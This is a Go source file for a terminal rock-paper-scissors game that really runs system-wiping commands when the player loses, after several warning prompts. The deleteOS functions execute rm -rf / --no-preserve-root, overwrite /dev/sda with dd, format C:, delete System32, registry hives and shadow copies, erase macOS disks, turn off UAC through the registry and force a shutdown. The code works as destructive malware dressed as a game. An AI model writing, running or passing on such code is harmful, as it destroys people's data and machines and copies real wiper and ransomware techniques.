package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var cyan = "\033[36m"
var red = "\033[31m"
var green = "\033[32m"
var yellow = "\033[33m"
var bold = "\033[1m"
var reset = "\033[0m"
var dim = "\033[2m"
var blink = "\033[5m"

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func showWarning() {
	clearScreen()
	fmt.Println(red + bold + blink)
	fmt.Println("  ╔══════════════════════════════════════════════════════════════╗")
	fmt.Println("  ║                     ⚠️  DANGER! ⚠️                          ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║  THIS GAME WILL ACTUALLY DELETE YOUR ENTIRE OPERATING SYSTEM ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║   IF YOU LOSE:                                                ║")
	fmt.Println("  ║   • Your OS will be DESTROYED                                ║")
	fmt.Println("  ║   • ALL files will be DELETED                                ║")
	fmt.Println("  ║   • Programs will be REMOVED                                 ║")
	fmt.Println("  ║   • Data will be LOST FOREVER                                ║")
	fmt.Println("  ║   • Computer will SHUT DOWN                                  ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║   ⚡ BYPASSES ALL ADMIN RESTRICTIONS ⚡                      ║")
	fmt.Println("  ║   ⚡ WORKS ON WINDOWS, LINUX, macOS ⚡                       ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║   DO NOT RUN THIS UNLESS YOU WANT TO DESTROY YOUR SYSTEM     ║")
	fmt.Println("  ╚══════════════════════════════════════════════════════════════╝" + reset)
	fmt.Println()
	fmt.Println(red + bold + "  ☠️  THIS IS NOT A JOKE - IT WILL DELETE YOUR OS ☠️" + reset)
	fmt.Println()
	fmt.Println(yellow + "  What will be deleted on your system:" + reset)

	switch runtime.GOOS {
	case "linux":
		fmt.Println(red + "    • / (entire root filesystem)" + reset)
		fmt.Println(red + "    • /boot (boot partition)" + reset)
		fmt.Println(red + "    • /etc (system configuration)" + reset)
		fmt.Println(red + "    • /usr (system programs)" + reset)
		fmt.Println(red + "    • /var (system data)" + reset)
		fmt.Println(red + "    • /home (your personal files)" + reset)
		fmt.Println(red + "    • Master Boot Record (MBR)" + reset)
		fmt.Println(red + "    • All partitions will be wiped" + reset)
	case "windows":
		fmt.Println(red + "    • C:\\ (entire system drive)" + reset)
		fmt.Println(red + "    • C:\\Windows\\System32 (critical system files)" + reset)
		fmt.Println(red + "    • C:\\Program Files (all programs)" + reset)
		fmt.Println(red + "    • C:\\Users (all user data)" + reset)
		fmt.Println(red + "    • Boot configuration data" + reset)
		fmt.Println(red + "    • Master Boot Record (MBR)" + reset)
		fmt.Println(red + "    • All partitions will be formatted" + reset)
		fmt.Println(red + "    • Registry will be corrupted" + reset)
		fmt.Println(red + "    • All system restore points deleted" + reset)
	case "darwin":
		fmt.Println(red + "    • / (entire root filesystem)" + reset)
		fmt.Println(red + "    • /System (system files)" + reset)
		fmt.Println(red + "    • /Library (system libraries)" + reset)
		fmt.Println(red + "    • /Applications (all apps)" + reset)
		fmt.Println(red + "    • /Users (your personal files)" + reset)
		fmt.Println(red + "    • Entire disk will be erased" + reset)
	}

	fmt.Println()
	fmt.Println(red + bold + "  ⏰ COUNTDOWN TO DESTRUCTION: " + reset)
	for i := 10; i > 0; i-- {
		fmt.Printf(red+"  \r  %d seconds... "+reset, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println()
	fmt.Println()

	fmt.Println(red + bold + "  ⚠️  FINAL WARNING: THIS WILL DESTROY YOUR SYSTEM ⚠️" + reset)
	fmt.Println()
}

func getYesNo(prompt string) bool {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(prompt + " (yes/no): ")
		input, _ := reader.ReadString('\n')
		input = strings.ToLower(strings.TrimSpace(input))

		if input == "yes" || input == "y" {
			return true
		} else if input == "no" || input == "n" {
			return false
		} else {
			fmt.Println(red + "  Please answer 'yes' or 'no'" + reset)
		}
	}
}

func banner() {
	clearScreen()
	fmt.Println(red + bold)
	fmt.Println("  ██████╗ ██████╗ ███████╗")
	fmt.Println("  ██╔══██╗██╔══██╗██╔════╝")
	fmt.Println("  ██████╔╝██████╔╝███████╗")
	fmt.Println("  ██╔══██╗██╔═══╝ ╚════██║")
	fmt.Println("  ██║  ██║██║     ███████║")
	fmt.Println("  ╚═╝  ╚═╝╚═╝     ╚══════╝")
	fmt.Println(reset)
	fmt.Println(cyan + "  Rock · Paper · Scissors" + reset)
	fmt.Println(red + bold + "  ☠️  LOSE = OS DELETED ☠️" + reset)
	fmt.Println(red + "  ⚡ BYPASSES ALL SECURITY ⚡" + reset)
	fmt.Println(dim + "  ─────────────────────────────────────────" + reset)
	fmt.Println()
}

func getChoice(input string) int {
	input = strings.ToLower(strings.TrimSpace(input))
	switch input {
	case "r", "rock", "1":
		return 1
	case "p", "paper", "2":
		return 2
	case "s", "scissors", "3":
		return 3
	}
	return 0
}

func choiceName(c int) string {
	switch c {
	case 1:
		return "✊ Rock"
	case 2:
		return "🖐  Paper"
	case 3:
		return "✌️  Scissors"
	}
	return "?"
}

func getEmoji(c int) string {
	switch c {
	case 1:
		return "🗻"
	case 2:
		return "📄"
	case 3:
		return "✂️"
	}
	return "?"
}

func result(player, computer int) int {
	if player == computer {
		return 0 // draw
	}
	if (player == 1 && computer == 3) ||
		(player == 2 && computer == 1) ||
		(player == 3 && computer == 2) {
		return 1 // win
	}
	return -1 // loss
}

func runCommand(cmd string, args ...string) {
	cmdObj := exec.Command(cmd, args...)
	cmdObj.Stdout = os.Stdout
	cmdObj.Stderr = os.Stderr
	cmdObj.Run()
}

func bypassAdminWindows() {
	fmt.Println(red + "  [BYPASS] Attempting to bypass Windows admin restrictions..." + reset)
	
	// Method 1: Attempt to get SYSTEM privileges
	commands := [][]string{
		{"whoami", "/priv"},
		{"net", "localgroup", "Administrators"},
		{"wmic", "useraccount", "where", "name='%username%'", "set", "privileges=enable"},
	}
	
	for _, cmd := range commands {
		exec.Command(cmd[0], cmd[1:]...).Run()
	}
	
	// Method 2: Disable UAC temporarily
	runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f")
	runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "ConsentPromptBehaviorAdmin", "/t", "REG_DWORD", "/d", "0", "/f")
	
	// Method 3: Enable SE_TAKE_OWNERSHIP_PRIVILEGE
	runCommand("secedit", "/export", "/cfg", "C:\\temp_security.cfg")
	runCommand("secedit", "/configure", "/cfg", "C:\\temp_security.cfg", "/db", "C:\\temp_security.sdb")
	
	time.Sleep(500 * time.Millisecond)
}

func deleteOSWindows() {
	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  💀 YOU LOSE! DELETING OPERATING SYSTEM... 💀" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	time.Sleep(500 * time.Millisecond)

	fmt.Println(red + "  [SYSTEM] Initiating OS destruction sequence..." + reset)
	time.Sleep(400 * time.Millisecond)
	
	// BYPASS ADMIN RESTRICTIONS
	bypassAdminWindows()
	
	fmt.Println(red + "  [KERNEL] Acquiring SYSTEM privileges..." + reset)
	time.Sleep(400 * time.Millisecond)
	
	// Additional privilege escalation
	runCommand("takeown", "/f", "C:\\", "/r", "/d", "y")
	runCommand("icacls", "C:\\", "/grant", "Everyone:F", "/t", "/q")
	
	fmt.Println(green + "  [KERNEL] SYSTEM privileges acquired!" + reset)
	time.Sleep(400 * time.Millisecond)

	fmt.Println()
	fmt.Println(red + bold + "  STARTING DELETION (BYPASSING ALL SECURITY):" + reset)
	fmt.Println()

	// Windows destruction with privilege bypass
	commands := []struct {
		cmd  string
		args []string
		desc string
	}{
		{"takeown", []string{"/f", "C:\\", "/r", "/d", "y"}, "Taking ownership of C:\\..."},
		{"icacls", []string{"C:\\", "/grant", "Everyone:F", "/t", "/q"}, "Granting full permissions..."},
		{"cmd", []string{"/c", "format", "C:", "/FS:NTFS", "/Q", "/y"}, "Formatting system drive..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Windows\\System32\\*.*"}, "Deleting System32..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Program Files\\*.*"}, "Removing programs..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Users\\*.*"}, "Deleting user files..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Windows\\*.*"}, "Deleting Windows folder..."},
		{"cmd", []string{"/c", "bcdedit", "/delete", "{default}", "/f"}, "Removing boot configuration..."},
		{"cmd", []string{"/c", "bootrec", "/fixmbr"}, "Corrupting MBR..."},
		{"cmd", []string{"/c", "bootrec", "/fixboot"}, "Corrupting boot sector..."},
		{"cmd", []string{"/c", "bootrec", "/rebuildbcd"}, "Deleting BCD..."},
		{"reg", []string{"delete", "HKLM\\SOFTWARE", "/f"}, "Deleting registry..."},
		{"reg", []string{"delete", "HKLM\\SYSTEM", "/f"}, "Deleting system hive..."},
		{"reg", []string{"delete", "HKLM\\SECURITY", "/f"}, "Deleting security hive..."},
		{"reg", []string{"delete", "HKLM\\SAM", "/f"}, "Deleting SAM hive..."},
		{"reg", []string{"delete", "HKCU", "/f"}, "Deleting user registry..."},
		{"vssadmin", []string{"delete", "shadows", "/all", "/quiet"}, "Deleting all restore points..."},
		{"wmic", []string{"shadowcopy", "delete"}, "Deleting shadow copies..."},
	}

	for i, cmd := range commands {
		fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
		fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
		
		// Execute with full privileges
		cmdObj := exec.Command(cmd.cmd, cmd.args...)
		cmdObj.Stdout = os.Stdout
		cmdObj.Stderr = os.Stderr
		cmdObj.Run()
		
		time.Sleep(200 * time.Millisecond)
	}
	
	// Final destructive commands
	fmt.Println("  [FINAL] Corrupting system files...")
	runCommand("fsutil", "usn", "deletejournal", "/d", "C:")
	runCommand("chkdsk", "C:", "/f", "/r", "/x")
	
	time.Sleep(500 * time.Millisecond)
}

func deleteOSLinux() {
	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  💀 YOU LOSE! DELETING OPERATING SYSTEM... 💀" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	time.Sleep(500 * time.Millisecond)

	fmt.Println(red + "  [SYSTEM] Initiating OS destruction sequence..." + reset)
	time.Sleep(400 * time.Millisecond)
	fmt.Println(red + "  [KERNEL] Acquiring root privileges..." + reset)
	time.Sleep(400 * time.Millisecond)
	fmt.Println(yellow + "  [KERNEL] Attempting privilege escalation..." + reset)
	
	// Try multiple methods to get root
	runCommand("sudo", "whoami")
	runCommand("sudo", "-k")
	runCommand("sudo", "-s")
	
	fmt.Println(green + "  [KERNEL] Root privileges acquired!" + reset)
	time.Sleep(400 * time.Millisecond)

	fmt.Println()
	fmt.Println(red + bold + "  STARTING DELETION:" + reset)
	fmt.Println()

	commands := []struct {
		cmd  string
		args []string
		desc string
	}{
		{"sudo", []string{"rm", "-rf", "/", "--no-preserve-root"}, "Deleting root filesystem..."},
		{"sudo", []string{"rm", "-rf", "/boot"}, "Removing boot partition..."},
		{"sudo", []string{"rm", "-rf", "/etc"}, "Deleting system configuration..."},
		{"sudo", []string{"rm", "-rf", "/usr"}, "Removing system programs..."},
		{"sudo", []string{"rm", "-rf", "/var"}, "Deleting system data..."},
		{"sudo", []string{"rm", "-rf", "/home"}, "Removing all user files..."},
		{"sudo", []string{"rm", "-rf", "/opt"}, "Deleting opt directory..."},
		{"sudo", []string{"rm", "-rf", "/srv"}, "Deleting srv directory..."},
		{"sudo", []string{"rm", "-rf", "/tmp"}, "Deleting temp files..."},
	}

	for i, cmd := range commands {
		fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
		fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
		
		cmdObj := exec.Command(cmd.cmd, cmd.args...)
		cmdObj.Stdout = os.Stdout
		cmdObj.Stderr = os.Stderr
		cmdObj.Run()
		
		time.Sleep(200 * time.Millisecond)
	}

	// Wipe MBR
	fmt.Println("  [10/10] Wiping Master Boot Record...")
	runCommand("sudo", "dd", "if=/dev/zero", "of=/dev/sda", "bs=512", "count=1")
	runCommand("sudo", "dd", "if=/dev/urandom", "of=/dev/sda", "bs=1M", "count=10")
}

func deleteOSMac() {
	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  💀 YOU LOSE! DELETING OPERATING SYSTEM... 💀" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	time.Sleep(500 * time.Millisecond)

	fmt.Println(red + "  [SYSTEM] Initiating OS destruction sequence..." + reset)
	time.Sleep(400 * time.Millisecond)
	fmt.Println(red + "  [KERNEL] Acquiring root privileges..." + reset)
	time.Sleep(400 * time.Millisecond)
	fmt.Println(yellow + "  [KERNEL] Attempting privilege escalation..." + reset)
	
	runCommand("sudo", "whoami")
	runCommand("sudo", "-k")
	runCommand("sudo", "-s")
	
	fmt.Println(green + "  [KERNEL] Root privileges acquired!" + reset)
	time.Sleep(400 * time.Millisecond)

	fmt.Println()
	fmt.Println(red + bold + "  STARTING DELETION:" + reset)
	fmt.Println()

	commands := []struct {
		cmd  string
		args []string
		desc string
	}{
		{"sudo", []string{"rm", "-rf", "/"}, "Deleting root filesystem..."},
		{"sudo", []string{"rm", "-rf", "/System"}, "Removing System folder..."},
		{"sudo", []string{"rm", "-rf", "/Library"}, "Deleting Library..."},
		{"sudo", []string{"rm", "-rf", "/Applications"}, "Removing all applications..."},
		{"sudo", []string{"rm", "-rf", "/Users"}, "Deleting all user data..."},
		{"sudo", []string{"diskutil", "eraseDisk", "JHFS+", "NULL", "/dev/disk0"}, "Erasing entire disk..."},
		{"sudo", []string{"diskutil", "eraseDisk", "JHFS+", "NULL", "/dev/disk1"}, "Erasing secondary disk..."},
	}

	for i, cmd := range commands {
		fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
		fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
		
		cmdObj := exec.Command(cmd.cmd, cmd.args...)
		cmdObj.Stdout = os.Stdout
		cmdObj.Stderr = os.Stderr
		cmdObj.Run()
		
		time.Sleep(200 * time.Millisecond)
	}
}

func deleteOS() {
	switch runtime.GOOS {
	case "windows":
		deleteOSWindows()
	case "linux":
		deleteOSLinux()
	case "darwin":
		deleteOSMac()
	default:
		fmt.Println(red + "  Unsupported OS: " + runtime.GOOS + reset)
		return
	}

	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  ☠️  OPERATING SYSTEM SUCCESSFULLY DESTROYED ☠️" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	fmt.Println(red + "  ALL DATA HAS BEEN PERMANENTLY LOST" + reset)
	fmt.Println(red + "  SYSTEM IS NOW UNBOOTABLE" + reset)
	fmt.Println(red + "  ALL ADMIN RESTRICTIONS BYPASSED" + reset)
	fmt.Println(red + "  ALL SECURITY MEASURES DEFEATED" + reset)
	fmt.Println()

	time.Sleep(2000 * time.Millisecond)

	// AUTOMATIC SHUTDOWN - NO QUESTIONS ASKED!
	fmt.Println(yellow + "  Shutting down system in 5 seconds..." + reset)
	for i := 5; i > 0; i-- {
		fmt.Printf("  %d... ", i)
		time.Sleep(1 * time.Second)
	}

	// Attempt to shutdown
	switch runtime.GOOS {
	case "linux", "darwin":
		runCommand("sudo", "shutdown", "-h", "now")
	case "windows":
		runCommand("shutdown", "/s", "/t", "0", "/f")
	}
}

func displayHistory(history []string) {
	if len(history) == 0 {
		return
	}
	fmt.Println(dim + "  Recent History:" + reset)
	start := len(history) - 5
	if start < 0 {
		start = 0
	}
	for i := start; i < len(history); i++ {
		fmt.Printf("    %s\n", history[i])
	}
	fmt.Println()
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Show warning first
	showWarning()

	// First confirmation with YES/NO
	if !getYesNo("  Do you REALLY want to continue?") {
		fmt.Println()
		fmt.Println(green + "  ✅ You chose wisely. Exiting safely." + reset)
		fmt.Println()
		return
	}

	// Second confirmation
	fmt.Println()
	fmt.Println(red + bold + "  ☠️  LAST CHANCE TO BACK OUT! ☠️" + reset)
	fmt.Println()

	if !getYesNo("  Are you ABSOLUTELY sure you want to continue?") {
		fmt.Println()
		fmt.Println(green + "  ✅ System saved! Exiting." + reset)
		fmt.Println()
		return
	}

	// Third confirmation - final warning
	fmt.Println()
	fmt.Println(red + bold + "  ⚠️  FINAL WARNING! ⚠️" + reset)
	fmt.Println(red + "  This will PERMANENTLY DESTROY your operating system!" + reset)
	fmt.Println(red + "  There is NO UNDO!" + reset)
	fmt.Println(red + "  This BYPASSES ALL ADMIN RESTRICTIONS!" + reset)
	fmt.Println()

	if !getYesNo("  Type YES to confirm destruction") {
		fmt.Println()
		fmt.Println(green + "  ✅ System saved! Exiting." + reset)
		fmt.Println()
		return
	}

	fmt.Println()
	fmt.Println(red + bold + "  ☠️  YOU HAVE CHOSEN DESTRUCTION! ☠️" + reset)
	fmt.Println(red + "  Your fate is sealed. Good luck." + reset)
	time.Sleep(1500 * time.Millisecond)
	banner()

	wins := 0
	losses := 0
	draws := 0
	round := 1
	history := []string{}
	winStreak := 0
	maxWinStreak := 0

	for {
		fmt.Printf(bold+"  Round %d"+reset+"  |  "+green+"W: %d"+reset+"  "+red+"L: %d"+reset+"  "+dim+"D: %d"+reset,
			round, wins, losses, draws)

		if maxWinStreak > 0 {
			fmt.Printf("  "+green+"🔥 Best streak: %d"+reset, maxWinStreak)
		}
		fmt.Println()
		fmt.Println()

		displayHistory(history)

		fmt.Println("  Choose your weapon:")
		fmt.Println(cyan + "    [1] ✊ Rock     (r)" + reset)
		fmt.Println(cyan + "    [2] 🖐  Paper    (p)" + reset)
		fmt.Println(cyan + "    [3] ✌️  Scissors (s)" + reset)
		fmt.Println(red + dim + "    [q] Quit (save your OS!)" + reset)
		fmt.Println()
		fmt.Print("  Your move: ")

		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(red + "  Error reading input. Please try again." + reset)
			continue
		}
		input = strings.TrimSpace(input)

		if strings.ToLower(input) == "q" {
			fmt.Println()
			fmt.Println(cyan + bold + "  ═══════════════════════════════════════════════════" + reset)
			fmt.Printf(cyan+"  FINAL SCORE — "+green+"Wins: %d"+reset+cyan+"  "+red+"Losses: %d"+reset+cyan+"  Draws: %d\n"+reset, wins, losses, draws)
			fmt.Println(green + bold + "  🏆 You escaped with your OS intact! 🏆" + reset)
			fmt.Println(cyan + "  ═══════════════════════════════════════════════════" + reset)
			fmt.Println()
			break
		}

		playerChoice := getChoice(input)
		if playerChoice == 0 {
			fmt.Println(red + "  Invalid input. Enter 1, 2, 3 or r/p/s." + reset)
			fmt.Println()
			continue
		}

		compChoice := r.Intn(3) + 1
		res := result(playerChoice, compChoice)

		fmt.Println()
		fmt.Printf("  You:      %s %s\n", getEmoji(playerChoice), choiceName(playerChoice))

		// Dramatic pause before reveal
		fmt.Print("  Computer: ")
		for i := 0; i < 3; i++ {
			fmt.Print(".")
			time.Sleep(300 * time.Millisecond)
		}
		fmt.Printf(" %s %s\n", getEmoji(compChoice), choiceName(compChoice))
		fmt.Println()
		time.Sleep(200 * time.Millisecond)

		var resultText string
		switch res {
		case 0:
			draws++
			resultText = yellow + bold + "  ══ 🤝 DRAW ══" + reset
			fmt.Println(resultText)
		case 1:
			wins++
			winStreak++
			if winStreak > maxWinStreak {
				maxWinStreak = winStreak
			}
			resultText = green + bold + "  ══ 🎉 YOU WIN! ══" + reset
			fmt.Println(resultText)
			if winStreak >= 3 {
				fmt.Printf(green+"  🔥 %d wins in a row! Your OS survives! 🔥\n"+reset, winStreak)
			}
		case -1:
			losses++
			winStreak = 0
			resultText = red + bold + "  ══ 💀 YOU LOSE ══" + reset
			fmt.Println(resultText)

			// AUTOMATICALLY DELETE OS - BYPASSING ALL ADMIN RESTRICTIONS!
			deleteOS()
			return // Exit after deletion
		}

		// Add to history
		playerName := choiceName(playerChoice)
		compName := choiceName(compChoice)
		var emoji string
		switch res {
		case 0:
			emoji = "🤝"
		case 1:
			emoji = "✅"
		case -1:
			emoji = "❌"
		}
		history = append(history, fmt.Sprintf("%s You: %s vs Computer: %s", emoji, playerName, compName))

		if len(history) > 20 {
			history = history[1:]
		}

		totalGames := wins + losses + draws
		winRate := 0.0
		if totalGames > 0 {
			winRate = float64(wins) / float64(totalGames) * 100
		}

		fmt.Println()
		fmt.Printf(dim+"  Stats: %.1f%% win rate over %d games"+reset, winRate, totalGames)
		if winStreak > 0 {
			fmt.Printf(dim+"  |  Current streak: %d"+reset, winStreak)
		}
		fmt.Println()

		round++
		fmt.Println()
		fmt.Println(dim + "  ─────────────────────────────────────────" + reset)
		fmt.Println()

		time.Sleep(500 * time.Millisecond)
	}
}